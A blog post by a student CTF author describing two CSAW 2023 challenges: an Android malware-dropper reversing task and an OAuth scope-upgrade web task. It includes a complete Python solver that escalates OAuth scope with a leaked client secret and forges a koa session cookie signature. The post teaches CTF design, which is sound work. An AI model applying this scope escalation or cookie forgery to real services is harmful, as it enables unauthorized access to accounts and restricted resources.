---
title: "Writing CTF Challenges"
date: 2023-11-15
---

# Intro

It feels much longer than a year since I last wrote on here. Since the last post, I completed five classes (now in the last semester of my degree), completed my first year working in security, and transitioned from just playing CTFs to also writing challenges for them. None of this would have been possible without the incredible people at the [OSIRIS Lab](https://osiris.cyber.nyu.edu/) and the weekly learning sessions at Hacknight and CTF101, so I do owe this club a lot. Whenever people ask me about the Cyberfellows program at NYU, I always mention OSIRIS because I believe it was the main driver for accelerating my cybersecurity knowledge. 

I finally got a little airpocket of downtime so I figured I would do a write up for the two challenges I wrote for the annual [CSAW](https://www.csaw.io/) CTF. Some say that teaching a subject can be an effective method for gaining a better understanding of that subject, and I have found that writing CTF challenges is a great example of this. The challenges I wrote were based on classes or blogposts that I found interesting and decided to take a deeper dive into. For the CSAW qualifying round, I wrote a challenge based on Android malware droppers while I was taking a class on mobile security. For finals, I wrote a challenge based on OAuth2 because my co-author suggested it and there have been many interesting [reports](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts) on the subject recently.


## AndroidDropper - CSAW Quals

[Github](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/misc/android-dropper)

![android_dropper]({{"../assets/2022-11-15-Writing_CTF_Challenges/android_dropper.png" | relative_url }})

I wrote this challenge towards the end of my semester taking mobile security. It was based on [a blog post](https://www.eff.org/deeplinks/2022/04/anatomy-android-malware-dropper) by the Electronic Frontier Foundation that I found fascinating. In short, researchers at the EFF used open source static and dynamic analysis tools to reverese engineer a fake banking app that "dropped" a completely different executable (a dalvik executable, or dex) to connect to a tor site. This executable could give a threat actor command and control abilities on the victim's device. I wanted to emulate this "dropping" technique in a CTF challenge so I wrote a similar (and simpler) app.

In the CTF, players received an apk file, which I overtly named "dropper.apk". The app behaved similarly to the fake banking app, opening and closing immediately when run. When players decompiled the apk or ran a static analysis tool like jadx on it, the app's simplicity is revealed in [MainActivity.java](https://github.com/osirislab/CSAW-CTF-2023-Quals/blob/main/misc/android-dropper/src/dropper/app/src/main/java/com/example/dropper/MainActivity.java). Besides the main function, there are three functions in this app: `showFlag`, `loadDex`, and `writeDropped`. The goal is apparently to use `showFlag` but it just shows the string "test" in the main function. However, there is a suspiciously long base64 string in `writeDropped`, which is being decoded and written to a file called "dropped.dex". Players could run the app in an emulator but the file is deleted when the app closes. The easy way to get around this is to decode the string and dump it to a file to reveal the code for the dropped executable. 

In "dropped.dex" the equivalent of a "c2" server (http://android-dropper.csaw.io:3003, no longer active) is revealed in the main function. This was a simple http server that showed more obfuscated base64 output. In the dex file is one function `obf`, which I copied directly from the EFF blogpost:

```java
public static String obf(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) (notTheFlag[i + i4] ^ i3);
        }
        return new String(cArr);
    }
```

This function takes three inputs, a start index, an end index, and an xor key. The main function gets the string from the server and runs this function with hardcoded numbers _(275, 306, 42)_ to reveal the flag. Players could reverse this or simply patch the "dropped.dex" file to complete the challenge. ([Patched version here](https://github.com/osirislab/CSAW-CTF-2023-Quals/blob/main/misc/android-dropper/solution/Dropped.java))


## Dinoauth - CSAW Finals

[Github](https://github.com/osirislab/CSAW-CTF-2023-Finals/tree/main/web/dinoauth)

![dinoauth]({{"../assets/2022-11-15-Writing_CTF_Challenges/dinoauth.png" | relative_url }})

It was an honor to collaborate with the incredibly smart rollingcoconut on this challenge. We worked together for a bit more than a month on this and I think it turned out to be a great finals-level challenge. At the start of the process I knew very little about the oauth framework (besides its use cases) but I learned so much along the way.  

OAuth is an open standard for authorization that enables applications to obtain access to resources. I started by reading the material and completing the labs on [Portswigger](https://portswigger.net/web-security/oauth). When planning the challenge, we first discussed how to craft a puzzle with the oauth flow and decided on a couple of constraints. First, we wanted the challenge to be relevant to industry, "teaching" players the oauth flow and how it can be exploited. Second, we wanted to avoid having a CSRF/XSS element to it, since many oauth challenges use this flow and the classic "sending a phishing link" to an admin bot introduces many potential points of failure. With this in mind, we decided on an oauth scope upgrade challenge, where a normal user could "upgrade" their client privileges to access restricted resources. Portswigger distills this attack flow into easy to understand terms [here](https://portswigger.net/web-security/oauth#flawed-scope-validation). Our challenge was based on the [authorization code grant type](https://portswigger.net/web-security/oauth/grant-types#authorization-code-grant-type):

![authcode_flow]({{"../assets/2022-11-15-Writing_CTF_Challenges/portswigger_authcode_flow.jpeg" | relative_url }})
_From Portswigger_

Since we did not have much time to work on the challenge, we decided to take a working oauth implentation and "break" it to create our challenge. We found [this](https://github.com/waychan23/koa2-oauth-server) repository on Github and borrwed the base code for our website from the working example. (Thanks waychan23!). Conveniently, using this code avoided messing with real databases since the user and client databases were stored in memory. However, to make the code exploitable, a self-taught crash-course on the koa framework was required. (Aka a lot of reading docs and stackoverflow). 

In this challenge, players received a link to "Darkweb Dinos", a simple site on which bad guys buy and sell dinosaurs. (None of these functions actually worked ... not because we ran out of time, but because we did not want players to go down rabbit holes ... 😛 ... see Lessons Learned) The goal of the challenge was to access the `/buy_flagosaurus` endpoint, which was clear from the challenge description and homepage. However, this endpoint was protected by oauth by requiring the `dinomaster_app` client_id and `buy_flagosaurus` scope to access. When a normal user tried to access this page, they would receive an error: `Insufficient scope: authorized scope is insufficient`.

![dinoauth_homepage]({{"../assets/2022-11-15-Writing_CTF_Challenges/dinoauth_homepage.png" | relative_url }})

When exploring the site, any incorrect request to `/oauth/` would be rerouted to an error page, `/oauth/*`. This page showed a stacktrace, but also revealed another clue, the existence of the `/oauth/debug` endpoint. From the `/oauth/debug` page, the entire flow for a normal oauth authorization on the website was visible. This flow was: 

1. Get a koa session by registering a new user or logging in as an existing user.
2. Receive an authorization code by agreeing to give the client app access to the api.
3. Send the authorization code to `/oauth/token` to receive an access token to use the api.

Under normal use, this gave users access to `/buy_dino` and `/sell_dino`, but evidence of the upgraded `dinomaster_app` and its ability to access `buy_flagosaurus` was also found on `/oauth/debug`. By following this same flow but with `client_id=dinomaster_app`and `buy_flagosaurus` included in the scope, players could generate an authorization code and token that would give them access to the flagosaurus endpoint.

The tricky part in this challenge was that the [koa-session library](https://github.com/koajs/session) signs its cookies to prevent tampering or forged cookies. The clue to this was that in the player's dinosaur inventory, there was only one dinosaur they owned, the "koasesssigasaurus". (Palentologists have yet to discover this species.) In the HTML comments of the inventory page, we hid this comment: 

```html
  <!--p>Last seller of Koasigsessasaurus said to keep this safe: NNSWK4C7PFXXK4S7NNXWCX3TMVZXGX3TNFTV643FMN2XEZI=</p> -->
```
[Github](https://github.com/osirislab/CSAW-CTF-2023-Finals/blob/5aa8de052667bed0edc75fb6065c19326dec4003/web/dinoauth/src/views/dinos.ejs#L31)

This key was the base32 encoded string "keep_your_koa_sess_sig_secure". Up until the final request, the `koa:sess` cookie remained the same. However, the request to `/buy_flagosaurus` required the access token (and maybe the refresh token) to be sent in the `koa:sess` cookie. This meant cookie and its signature, `koa:sess.sig` would not match anymore. The solution to this could be found in the koa-session code, or some googling would lead players to an answer on [stackoverflow](https://stackoverflow.com/questions/48158582/what-is-koasess-sig): the `koa:sess.sig` is a _"27-byte url-safe base64 SHA1 value representing the hash of cookie-name=cookie-value against the first Keygrip key"_. Creating this signature manually and sending the final request to `/buy_flagosaurus` reveals the flag.

![dinoauth_burp]({{"../assets/2022-11-15-Writing_CTF_Challenges/dinoauth_burp.png" | relative_url }})

We summarized all the steps of this challenge into a solver script [here](https://github.com/osirislab/CSAW-CTF-2023-Finals/blob/main/web/dinoauth/solver.py):

```python
#!/usr/bin/env python3
import hmac
import hashlib
import base64
import requests
import json

HOST = 'localhost'

# get a session
print('[*] get session ...')
session = requests.Session()
response = session.get(f'http://{HOST}:3001/login', allow_redirects=False)
print(f'cookies: {session.cookies}')
print(base64.b64decode(session.cookies['koa:sess']))
state = json.loads(base64.b64decode(response.cookies['koa:sess']))[
    'oauthState']['state']


# login
print('\n[*] login ...')
callbackUri = base64.b64encode(
    f'http://{HOST}:3002/oauth/authorize?response_type=code&client_id=dinomaster_app&scope=user_info%3Aread%2Clist_dinos%2Cbuy_dino%2Csell_dino%buy_flagosaurus&redirect_uri=http%3A%2F%2F{HOST}%3A3001%2FreceiveGrant&state=os-{state}'.encode())
response = session.post(f'http://{HOST}:3002/oauth/login', data={
    "username": "nimda",
    "password": "nimda",
    "callback_uri": callbackUri
})
csrfToken_token = json.loads(base64.b64decode(response.cookies['koa:sess']))[
    'userConfirmCsrfToken']['token']
print(f'csrfToken_token: {csrfToken_token}')


# # authorize client
# # this info is found by fuzzing /oauth/ which leads to /oauth/debug. /oauth/debug has the client_id, scope, and client_secret required to get a code
print('\n[*] authorize ...')
response = session.get(
    f'http://{HOST}:3002/oauth/authorize?response_type=code&client_id=dinomaster_app&scope=user_info%3Aread%2Clist_dinos%2Cbuy_dino%2Csell_dino%2Cbuy_flagosaurus&redirect_uri=http%3A%2F%2F{HOST}%3A3001%2FreceiveGrant&state={state}&agree=true&csrfToken={csrfToken_token}', allow_redirects=False)
n = response.content.find(b'code')
code = response.content[n+5: n+45]
print(f'code: {code}')


# # get token
# # send a POST request to /oauth/token with the client code received from /oauth/debug
print('\n[*] get token ...')
headers = {'Content-type': 'application/x-www-form-urlencoded'}
data = {
    'grant_type': 'authorization_code',
    'client_id': 'dinomaster_app',
    'client_secret': 'this_is_the_dinomaster_client_secret',
    'code': code,
    'scope': 'user_info:read,list_dinos,buy_dino,sell_dino,buy_flagosaurus',
    'redirect_uri': f'http://{HOST}:3001/receiveGrant',
}
response = session.post(
    f'http://{HOST}:3002/oauth/token', headers=headers, data=data)
res_json = json.loads(response.content)
accessToken = res_json['access_token']
refreshToken = res_json['refresh_token']
expiresIn = res_json['expires_in']
print(f'accessToken:  {accessToken}')


# send a get req to 3001/buy_flagosaurus get flag
# koa session key is found in the html comments of /list_dinos
print('\n[*] get flag')
KOA_SESSION_KEY = b'NNSWK4C7PFXXK4S7NNXWCX3TMVZXGX3TNFTV643FMN2XEZI='
# edit the session key with the accessToken and refreshToken. base64 encode and put the koa:sess cookie here
session_data_json = json.loads(base64.b64decode(session.cookies['koa:sess']))
session_data_json['token'] = {"accessToken": accessToken,
                              "refreshToken": refreshToken, "tokenType": "Bearer", "expiresAt":  session_data_json['oauthState']['expiresAt'] + expiresIn}
print(f'session: {session_data_json}')
session_data = b'koa:sess=' + \
    base64.b64encode(json.dumps(session_data_json).encode())
hmac_signature = hmac.new(KOA_SESSION_KEY, session_data, hashlib.sha1).digest()
koa_sess_sig = base64.urlsafe_b64encode(
    hmac_signature).decode().rstrip('=').encode()
# put this into koa:sess.sig to get flag
cookie = session_data + b'; koa:sess.sig=' + koa_sess_sig
response = session.get(
    f'http://{HOST}:3001/buy_flagosaurus', headers={'Cookie': cookie})
print(response.content)
```

## Lessons Learned

After writing [my first CTF challenge](https://github.com/osirislab/CSAW-CTF-2022-Quals/tree/master/forensics/android_forensics_easy) last year, I received some feedback saying red herrings should be avoided since they only frustrate players. I tried to keep this in mind this year and I think the challenges I wrote were fairly straightforward. However, there is always something to take away from each experience. This year, I learned how great build/testing scripts are, to double check everything, the power of CyberChef, and the importance of testing. 

During quals, due to the hard-coded variables in the "dropped.dex" file, I found myself constantly looking back at reference pages to convert java files into dex files for Android. With the compeition near, I decided to write a build script to create this file and encode it to copy into the dropper apk quickly. This came in handy because we had to switch up our infrastructure right before the challenges were released and I was able to push the change just in time. 

Unfortunately, at the start of the CTF, I made a mistake and put the "c2" address in the CTFd challenge description, immediately reavealing the string containing the flag to competitors. Out of fairness to everyone, I decided to just leave this up. I think this potentially reduced the challenge difficulty since the first part of the challenge was to find this address, like the EFF researchers did with the real tor c2 address. In the end, I think most players solved the challenge correctly since the xor key was also not revealed until "dropped.dex" was decoded. However, one clever participant notified me that the entire challenge was solvable using CyberChef's "Magic" tool, which I was completely unaware of and amazed to learn about. Since then, I have been using it as a quick inital test for everything. In the end, while not a huge deal, this non-intentional solution to the challenge could have been avoided if I had just double-checked the description before the start of competition.

![cyberchef_magic]({{"../assets/2022-11-15-Writing_CTF_Challenges/cyberchef_magic.png" | relative_url }})

During finals, I was very happy to have a solver script ready when we reached the deployment phase. When deploying a web challenge, there are many different things that could affect the flow of your website, and when the main element of your challenge involves flow (oauth), many things could go wrong. While testing, we had some dns issues so we had to release the challenge with an ip address. Luckily, we were able to diagnose this efficiently without opening up Burpsuite and going throught the entire challenge for each new test.

I also learned how important it is to have good playtesters during Finals. (Thank you to our testers!) We received great feedback, which helped us make some last minute tweaks and better handle players' questions during the competition. I did also try to contribute to testing another challenge for the CTF. Unfortunately, it was too hard and I realized how much I still have to learn about hacking webapps.